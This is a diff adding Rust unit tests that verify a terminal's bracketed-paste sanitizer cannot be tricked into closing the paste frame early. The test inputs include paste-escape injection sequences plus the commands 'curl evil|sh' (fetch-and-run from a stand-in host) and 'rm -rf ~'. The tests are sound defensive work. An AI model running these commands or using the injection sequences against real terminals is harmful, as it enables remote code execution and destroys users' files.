@@ -1,10 +1,12 @@
 use super::{
-    CLIPBOARD_IMAGE_MAX_AGE, FileDropTarget, PathQuoteStyle, PendingKeyRelease,
-    PendingKeyReleaseAction, classify_file_drop_target, clipboard_entries_to_terminal_paste_input,
-    clipboard_item_to_terminal_paste_input, dropped_paths_to_terminal_paste_input, image_extension,
+    BRACKETED_PASTE_END, BRACKETED_PASTE_START, CLIPBOARD_IMAGE_MAX_AGE, FileDropTarget,
+    PathQuoteStyle, PendingKeyRelease, PendingKeyReleaseAction, classify_file_drop_target,
+    clipboard_entries_to_terminal_paste_input, clipboard_item_to_terminal_paste_input,
+    dropped_paths_to_terminal_paste_input, framed_bracketed_paste_input, image_extension,
     is_compose_dead_key, kitty_png_clipboard_item, modifier_transition_events,
-    normalize_paste_line_endings, shell_quote_paths, should_defer_altgr_key_down_to_ime,
-    should_defer_key_down_to_ime, should_prepare_terminal_input_write, should_write_drop_to_target,
+    normalize_paste_line_endings, sanitize_bracketed_paste_payload, shell_quote_paths,
+    should_defer_altgr_key_down_to_ime, should_defer_key_down_to_ime,
+    should_prepare_terminal_input_write, should_write_drop_to_target,
     take_deferred_ime_key_release, take_pending_key_release_action,
     terminal_modifier_transition_events, write_clipboard_image_in,
 };
@@ -205,6 +207,124 @@ fn paste_line_endings_become_carriage_returns() {
         normalize_paste_line_endings(b"no newline"),
         std::borrow::Cow::Borrowed(_)
     ));
+}
+
+fn occurrences(haystack: &[u8], needle: &[u8]) -> usize {
+    haystack
+        .windows(needle.len())
+        .filter(|window| *window == needle)
+        .count()
+}
+
+/// The framed paste holds exactly one start and one end marker, at its
+/// edges, so nothing inside can end the bracket, and returns the payload.
+fn assert_single_frame(framed: &[u8]) -> &[u8] {
+    assert!(framed.starts_with(BRACKETED_PASTE_START), "{framed:?}");
+    assert!(framed.ends_with(BRACKETED_PASTE_END), "{framed:?}");
+    assert_eq!(occurrences(framed, BRACKETED_PASTE_START), 1, "{framed:?}");
+    assert_eq!(occurrences(framed, BRACKETED_PASTE_END), 1, "{framed:?}");
+    let payload = &framed[BRACKETED_PASTE_START.len()..framed.len() - BRACKETED_PASTE_END.len()];
+    assert!(!payload.contains(&0x1b), "{framed:?}");
+    payload
+}
+
+fn framed(payload: &[u8]) -> Vec<u8> {
+    [BRACKETED_PASTE_START, payload, BRACKETED_PASTE_END].concat()
+}
+
+#[test]
+fn bracketed_paste_cannot_rebuild_an_end_marker_from_fragments() {
+    // Stripping only the inner `ESC[201~` used to join `ESC[20` and `1~` into
+    // a new end marker, so `curl evil|sh` ran without the user pressing Enter.
+    let pasted = framed_bracketed_paste_input(b"ls\x1b[20\x1b[201~1~\rcurl evil|sh\r");
+    assert_single_frame(&pasted);
+    assert_eq!(pasted, framed(b"ls[20[201~1~\rcurl evil|sh\r"));
+}
+
+#[test]
+fn bracketed_paste_survives_deeply_nested_markers() {
+    for marker in ["\x1b[201~", "\x1b[200~"] {
+        let mut nested = marker.to_owned();
+        for _ in 0..5 {
+            nested = format!("\x1b[20{nested}{}", &marker[4..]);
+        }
+        let pasted = framed_bracketed_paste_input(format!("a{nested}rm -rf ~\r").as_bytes());
+        let payload = assert_single_frame(&pasted);
+        assert!(payload.starts_with(b"a[20[20"), "{payload:?}");
+        assert!(payload.ends_with(b"~rm -rf ~\r"), "{payload:?}");
+    }
+}
+
+#[test]
+fn bracketed_paste_markers_split_across_the_frame_stay_inert() {
+    for payload in [
+        &b"echo\x1b"[..],
+        b"echo\x1b[",
+        b"echo\x1b[20",
+        b"echo\x1b[201",
+        b"~echo",
+        b"1~echo",
+        b"01~echo",
+        b"[201~echo",
+    ] {
+        assert_single_frame(&framed_bracketed_paste_input(payload));
+    }
+
+    // Two pastes whose halves would meet as a marker each keep their frame.
+    let mut both = framed_bracketed_paste_input(b"one\x1b[20");
+    both.extend(framed_bracketed_paste_input(b"1~two"));
+    assert_eq!(occurrences(&both, BRACKETED_PASTE_END), 2);
+    assert_eq!(both, [framed(b"one[20"), framed(b"1~two")].concat());
+}
+
+#[test]
+fn bracketed_paste_keeps_plain_text_and_its_controls_unchanged() {
+    let text = b"ls -la\tcd ~/src/termy\r\x03echo done\r";
+    assert!(matches!(
+        sanitize_bracketed_paste_payload(text),
+        std::borrow::Cow::Borrowed(_)
+    ));
+    assert_eq!(framed_bracketed_paste_input(text), framed(text));
+
+    // `ě` (C4 9B) and `ț` (C8 9B) end in the C1 CSI byte but are not CSI.
+    let text = "cd ~/Projekty/ě ț → 日本\r".as_bytes();
+    assert_eq!(&*sanitize_bracketed_paste_payload(text), text);
+    assert_eq!(framed_bracketed_paste_input(text), framed(text));
+    assert_eq!(framed_bracketed_paste_input(b""), framed(b""));
+}
+
+#[test]
+fn bracketed_paste_of_only_markers_leaves_harmless_text() {
+    let pasted = framed_bracketed_paste_input(b"\x1b[200~\x1b[201~\x1b[201~");
+    assert_eq!(assert_single_frame(&pasted), b"[200~[201~[201~");
+    assert_eq!(framed_bracketed_paste_input(b"\x1b\x1b\x1b"), framed(b""));
+}
+
+#[test]
+fn bracketed_paste_drops_the_eight_bit_csi_introducer() {
+    assert_eq!(
+        framed_bracketed_paste_input("a\u{9b}201~b".as_bytes()),
+        framed(b"a201~b")
+    );
+    // A lone 0x9B byte outside UTF-8 goes too; other invalid bytes stay.
+    assert_eq!(
+        framed_bracketed_paste_input(b"a\x9b201~\xffb"),
+        framed(b"a201~\xffb")
+    );
+}
+
+#[test]
+fn bracketed_paste_frame_holds_for_every_short_marker_fragment_mix() {
+    const ALPHABET: &[u8] = b"\x1b[0~12x";
+    const LENGTH: u32 = 6;
+    let mut payload = vec![0; LENGTH as usize];
+    for mut code in 0..(ALPHABET.len() as u32).pow(LENGTH) {
+        for byte in &mut payload {
+            *byte = ALPHABET[(code % ALPHABET.len() as u32) as usize];
+            code /= ALPHABET.len() as u32;
+        }
+        assert_single_frame(&framed_bracketed_paste_input(&payload));
+    }
 }
 
 #[test]
